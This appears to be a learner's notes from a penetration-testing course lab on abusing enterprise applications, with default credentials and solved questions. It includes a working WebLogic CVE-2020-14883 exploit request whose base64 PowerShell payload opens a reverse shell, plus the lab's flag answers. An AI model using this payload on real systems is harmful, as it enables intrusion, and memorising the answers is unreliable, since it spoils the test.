# Other Notable Applications
<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Application</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Abuse Info</th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://axis.apache.org/axis2/java/core/" rel="nofollow" target="_blank" class="hover:underline text-green-400">Axis2</a></td><td class="p-4">This can be abused similar to Tomcat. We will often actually see it sitting on top of a Tomcat installation. If we cannot get RCE via Tomcat, it is worth checking for weak/default admin credentials on Axis2. We can then upload a <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar" rel="nofollow" target="_blank" class="hover:underline text-green-400">webshell</a> in the form of an AAR file (Axis2 service file). There is also a Metasploit <a href="https://packetstormsecurity.com/files/96224/Axis2-Upload-Exec-via-REST.html" rel="nofollow" target="_blank" class="hover:underline text-green-400">module</a> that can assist with this.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://en.wikipedia.org/wiki/IBM_WebSphere_Application_Server" rel="nofollow" target="_blank" class="hover:underline text-green-400">Websphere</a></td><td class="p-4">Websphere has suffered from many different <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-14/product_id-576/cvssscoremin-9/cvssscoremax-/IBM-Websphere-Application-Server.html" rel="nofollow" target="_blank" class="hover:underline text-green-400">vulnerabilities</a> over the years. Furthermore, if we can log in to the administrative console with default credentials such as <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">system:manager</code> we can deploy a WAR file (similar to Tomcat) and gain RCE via a web shell or reverse shell.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://en.wikipedia.org/wiki/Elasticsearch" rel="nofollow" target="_blank" class="hover:underline text-green-400">Elasticsearch</a></td><td class="p-4">Elasticsearch has had its fair share of vulnerabilities as well. Though old, we have seen <a href="https://www.exploit-db.com/exploits/36337" rel="nofollow" target="_blank" class="hover:underline text-green-400">this</a> before on forgotten Elasticsearch installs during an assessment for a large enterprise (and identified within 100s of pages of EyeWitness report output). Though not realistic, the Hack The Box machine <a href="https://youtube.com/watch?v=oGO9MEIz_tI&amp;t=54" rel="nofollow" target="_blank" class="hover:underline text-green-400">Haystack</a> features  Elasticsearch.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://en.wikipedia.org/wiki/Zabbix" rel="nofollow" target="_blank" class="hover:underline text-green-400">Zabbix</a></td><td class="p-4">Zabbix is an open-source system and network monitoring solution that has had quite a few <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-5667/product_id-9588/Zabbix-Zabbix.html" rel="nofollow" target="_blank" class="hover:underline text-green-400">vulnerabilities</a> discovered such as SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and remote code execution. Zabbix also has built-in functionality that can be abused to gain remote code execution. The HTB box <a href="https://youtube.com/watch?v=RLvFwiDK_F8&amp;t=250" rel="nofollow" target="_blank" class="hover:underline text-green-400">Zipper</a> showcases how to use the Zabbix API to gain RCE.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://en.wikipedia.org/wiki/Nagios" rel="nofollow" target="_blank" class="hover:underline text-green-400">Nagios</a></td><td class="p-4">Nagios is another system and network monitoring product. Nagios has had a  wide variety of issues over the years, including remote code execution, root privilege escalation, SQL injection, code injection, and stored XSS. If you come across a Nagios instance, it is worth checking for the default credentials <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">nagiosadmin:PASSW0RD</code> and fingerprinting the version.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://en.wikipedia.org/wiki/Oracle_WebLogic_Server" rel="nofollow" target="_blank" class="hover:underline text-green-400">WebLogic</a></td><td class="p-4">WebLogic is a Java EE application server. At the time of writing, it has 190 reported <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-14534/Oracle-Weblogic-Server.html" rel="nofollow" target="_blank" class="hover:underline text-green-400">CVEs</a>. There are many unauthenticated RCE exploits from 2007 up to 2021, many of which are Java Deserialization vulnerabilities.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Wikis/Intranets</td><td class="p-4">We may come across internal Wikis (such as MediaWiki), custom intranet pages, SharePoint, etc. These are worth assessing for known vulnerabilities but also searching if there is a document repository. We have run into many intranet pages (both custom and SharePoint) that had a search functionality which led to discovering valid credentials.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://en.wikipedia.org/wiki/DNN_(software)" rel="nofollow" target="_blank" class="hover:underline text-green-400">DotNetNuke</a></td><td class="p-4">DotNetNuke (DNN) is an open-source CMS written in C# that uses the .NET framework. It has had a few severe <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-2486/product_id-4306/Dotnetnuke-Dotnetnuke.html" rel="nofollow" target="_blank" class="hover:underline text-green-400">issues</a> over time, such as authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://en.wikipedia.org/wiki/VCenter" rel="nofollow" target="_blank" class="hover:underline text-green-400">vCenter</a></td><td class="p-4">vCenter is often present in large organizations to manage multiple instances of ESXi. It is worth checking for weak credentials and vulnerabilities such as this <a href="https://blog.gdssecurity.com/labs/2017/4/13/vmware-vcenter-unauthenticated-rce-using-cve-2017-5638-apach.html" rel="nofollow" target="_blank" class="hover:underline text-green-400">Apache Struts 2 RCE</a> that scanners like Nessus do not pick up. This <a href="https://www.rapid7.com/db/modules/exploit/multi/http/vmware_vcenter_uploadova_rce/" rel="nofollow" target="_blank" class="hover:underline text-green-400">unauthenticated OVA file upload</a> vulnerability was disclosed in early 2021, and a PoC for <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005" rel="nofollow" target="_blank" class="hover:underline text-green-400">CVE-2021-22005</a> was released during the development of this module. vCenter comes as both a Windows and a Linux appliance. If we get a shell on the Windows appliance, privilege escalation is relatively simple using JuicyPotato or similar. We have also seen vCenter already running as SYSTEM and even running as a domain admin! It can be a great foothold in the environment or be a single source of compromise.</td></tr></tbody></table>

## Questions
1. Enumerate the target host and identify the running application. What application is running? **Answer: WebLogic**
   - Run a nmap scan on all ports → identified WebLogic open on port 7001:
        ```shellsession
        $ sudo nmap -sV -sC -Pn -p- -T4 10.129.201.102
        Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-27 04:34 EDT
        Nmap scan report for 10.129.201.102
        Host is up (0.15s latency).
        Not shown: 65519 closed tcp ports (reset)
        PORT      STATE SERVICE       VERSION
        21/tcp    open  ftp           Microsoft ftpd
        | ftp-syst: 
        |_  SYST: Windows_NT
        | ftp-anon: Anonymous FTP login allowed (FTP code 230)
        | 09-07-20  04:51PM       <DIR>          aspnet_client
        | 09-07-20  04:49PM                99710 iisstart.png
        |_09-07-20  07:13PM                  218 web.config
        80/tcp    open  http          Microsoft IIS httpd 10.0
        | http-methods: 
        |_  Potentially risky methods: TRACE
        |_http-server-header: Microsoft-IIS/10.0
        |_http-title: 10.129.201.102 - /
        135/tcp   open  msrpc         Microsoft Windows RPC
        139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
        443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
        | tls-alpn: 
        |   h2
        |_  http/1.1
        |_ssl-date: 2026-06-27T08:39:03+00:00; +1s from scanner time.
        | ssl-cert: Subject: commonName=MS01
        | Not valid before: 2020-09-06T23:51:02
        |_Not valid after:  2021-03-08T23:51:02
        |_http-title: 10.129.201.102 - /
        | http-methods: 
        |_  Potentially risky methods: TRACE
        |_http-server-header: Microsoft-IIS/10.0
        445/tcp   open  microsoft-ds?
        5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-server-header: Microsoft-HTTPAPI/2.0
        |_http-title: Not Found
        7001/tcp  open  http          Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)
        |_weblogic-t3-info: T3 protocol in use (WebLogic version: 12.2.1.3)
        |_http-title: Error 404--Not Found
        47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-server-header: Microsoft-HTTPAPI/2.0
        |_http-title: Not Found
        49664/tcp open  msrpc         Microsoft Windows RPC
        49665/tcp open  msrpc         Microsoft Windows RPC
        49666/tcp open  msrpc         Microsoft Windows RPC
        49667/tcp open  msrpc         Microsoft Windows RPC
        49668/tcp open  msrpc         Microsoft Windows RPC
        49669/tcp open  msrpc         Microsoft Windows RPC
        49670/tcp open  msrpc         Microsoft Windows RPC
        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

        Host script results:
        |_smb2-time: Protocol negotiation failed (SMB2)

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 264.67 seconds
        ```
2. Enumerate the application for vulnerabilities. Gain remote code execution and submit the contents of the flag.txt file on the administrator desktop. **Answer: w3b_l0gic_RCE!**
   - Oracle WebLogic admin httpd 12.2.1.3 is vulnerable to an unauthenticated RCE - [CVE-2020-14883](https://github.com/murataydemir/CVE-2020-14883)
   - Exploit it to gain a reverse shell using powershell base64 reverse shell payload:
        ```
        POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
        Host: 10.129.201.102:7001
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 1469

        _nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADkAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA');");
        ```
        ```shellsession
        $ nc -nlvp 9001
        Listening on 0.0.0.0 9001
        Connection received on 10.129.201.102 49685
        whoami
        nt authority\system
        PS C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain> cd C:\Users\Administrator
        PS C:\Users\Administrator> cd Desktop
        PS C:\Users\Administrator\Desktop> dir


            Directory: C:\Users\Administrator\Desktop


        Mode                LastWriteTime         Length Name                          
        ----                -------------         ------ ----                          
        -a----        9/29/2021   2:48 PM             14 flag.txt                      
        -a----        9/29/2021   2:02 PM            503 WebLogic_Admin_WinSvc_Install.
                                                        cmd                           


        PS C:\Users\Administrator\Desktop> more flag.txt
        w3b_l0gic_RCE!
        ```